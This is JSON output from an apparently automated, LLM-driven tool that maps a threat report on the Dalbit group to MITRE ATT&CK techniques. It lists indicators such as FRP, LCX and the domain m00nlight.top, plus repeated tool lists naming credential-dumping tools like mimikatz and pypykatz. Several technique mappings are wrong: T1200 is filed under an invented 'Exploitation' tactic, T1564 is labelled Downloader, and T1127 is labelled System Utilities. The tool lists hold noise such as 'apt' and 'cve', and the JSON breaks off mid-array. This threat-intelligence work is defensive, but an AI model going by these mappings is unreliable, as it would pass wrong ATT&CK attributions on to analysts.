{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 31,
      "langchain_extractions": 2,
      "high_confidence_ttps": 0,
      "processing_time_ms": 8198.261999999999
    },
    "extraction_results": [
      {
        "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
        "extracted_ttps": [
          {
            "ttp_id": "f8cebeb7-e87a-4b3e-8fda-a1b7a3423b35",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "The group used proxy tools like FRP and LCX for communication, specifically using the Socks5 protocol",
            "confidence_score": 0.764,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "FRP",
              "LCX",
              "Socks5",
              "m00nlight.top"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "LCX",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "FRP",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d0931c24-4dad-41e1-85d9-713551684d2a",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "The threat actor used a hosting server (m00nlight.top) as a proxy and download server for their command and control (C2) communications.",
            "confidence_score": 0.755,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.468,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "m00nlight.top"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8dd97a1e-5aa9-450b-866b-c00721a1a9d8",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Fast Reverse Proxy",
            "attack_id": "T1090.003",
            "tactic": "Command and Control",
            "description": "The threat actor used Fast Reverse Proxy (FRP) to attack Korean companies, as mentioned in a previous report.",
            "confidence_score": 0.735,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.399,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "FRP"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fdd33c33-054c-4cda-8d43-29c8859aa58d",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The threat actor used open-source tools and command-line interfaces, such as CMD, to execute commands on compromised systems.",
            "confidence_score": 0.702,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe",
              "Certutil",
              "Bitsadmin",
              "At"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5a20b8d7-5d99-4893-a1cd-881ef643aa07",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The Dalbit group used various command line tools such as At, Bitsadmin, CMD, Certutil, and MetaSploit",
            "confidence_score": 0.701,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "At",
              "Bitsadmin",
              "CMD",
              "Certutil",
              "MetaSploit"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d03e329c-f807-4e8d-9c94-89ce58baf22c",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Backdoor",
            "attack_id": "T1219",
            "tactic": "Persistence",
            "description": "Detected Malware: APT, Backdoor",
            "confidence_score": 0.697,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Backdoor"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "Backdoor",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5d9d8dcc-4dc6-4a1f-95a1-6e95d2ef1996",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The threat actor may have exploited a vulnerability in a Korean groupware solution to infect companies, although this is not confirmed.",
            "confidence_score": 0.692,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.468,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Korean groupware solution"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "Malware",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3d770afd-b9b6-4c2a-9535-75668d3c7ebd",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Server Software Vulnerability",
            "attack_id": "T1200",
            "tactic": "Exploitation",
            "description": "The threat actor may have exploited a vulnerability in a server to gain access to confidential information and deploy ransomware.",
            "confidence_score": 0.691,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.46,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Server vulnerability"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "Malware",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1d26b3c0-049a-4ce9-83f3-2c4e8b4fe75a",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Remote Access Tools",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "The Dalbit group used remote control tools to infiltrate servers and PC devices",
            "confidence_score": 0.667,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "FRP configuration files (.ini)"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "FRP",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "893bf07c-1438-4038-bfb2-529ac38beae6",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Downloader",
            "attack_id": "T1564",
            "tactic": "Initial Access",
            "description": "Detected Malware: Downloader",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.054,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Downloader"
            ],
            "tools": [
              "At",
              "Downloader",
              "bitsadmin",
              "mimikatz",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "10557c05-be9c-438d-8680-8b765ff2c2f7",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c0245026-adba-491b-ad92-f6a580081d8f",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected use of CMD",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CMD",
              "cmd.exe"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1829590e-f3d1-49b3-ad1d-8f435f2f2b89",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "System Utilities",
            "attack_id": "T1127",
            "tactic": "Execution",
            "description": "Detected use of Bitsadmin",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Bitsadmin",
              "bitsadmin.exe"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ca3ee8ac-daab-403a-8ee4-497413758b31",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "System Utilities",
            "attack_id": "T1127",
            "tactic": "Execution",
            "description": "Detected use of Certutil",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Certutil",
              "certutil.exe"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a0c708f5-89bc-4601-a618-764830395967",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Scheduled Task",
            "attack_id": "T1053",
            "tactic": "Execution",
            "description": "Detected use of At",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "At",
              "at.exe"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c5a9136d-8bc1-420a-80f4-da4da5a12d1f",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Detected use of MetaSploit",
            "confidence_score": 0.634,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.077,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "MetaSploit"
            ],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "9a26d4e2-c2a0-48b9-954b-191b8f81447c",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "02b00e9a-b8b3-422e-b4f4-089892d95f9d",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b33132b7-88be-44e5-bf65-898bd404ce52",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "10c35bc1-92f9-4fbf-8aac-dfd19c8c27b1",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9b47d6d2-6a6e-46ec-894b-c88c93bf3765",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Windows Management Instrumentation",
            "attack_id": "T1047",
            "tactic": "Execution",
            "description": "Detected Windows Management Instrumentation activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "fd14d389-d45c-49b3-840c-4af46575dcd0",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "OS Credential Dumping",
            "attack_id": "T1003",
            "tactic": "Credential Access",
            "description": "Detected OS Credential Dumping activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "716c3243-5447-4556-9fa7-aeb88316f75e",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Network Service Discovery",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "Detected Network Service Discovery activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "43d737c8-d885-49e2-9ecb-a3d162998734",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "69f06b42-48ae-47f6-a8a8-26111ee5a4d9",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Scheduled Task/Job",
            "attack_id": "T1053",
            "tactic": "Persistence",
            "description": "Detected Scheduled Task/Job activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "53fa7c2a-f0e2-4da9-8bb2-a789f1506f5d",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Account Discovery",
            "attack_id": "T1087",
            "tactic": "Discovery",
            "description": "Detected Account Discovery activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
              "sc",
              "zip",
              "Bitsadmin",
              "apt",
              "psexec",
              "MetaSploit",
              "ReG",
              "Mimikatz",
              "wmic",
              "WMI"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "ac513977-d418-419d-bb4f-55ac6a87c6b2",
            "report_id": "pdf-b25102e174ffdc1f9410a46359142861",
            "technique_name": "Remote Services",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Services activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "At",
              "mimikatz",
              "bitsadmin",
              "schtasks",
              "cve",
              "ftp",
              "PsExec",
              "cmd",
              "netsh",
              "Certutil",
              "CMD",
              "pypykatz",
              "net",
              "metasploit",
              "ping",
              "lsass",
              "wmi",
              "certutil",
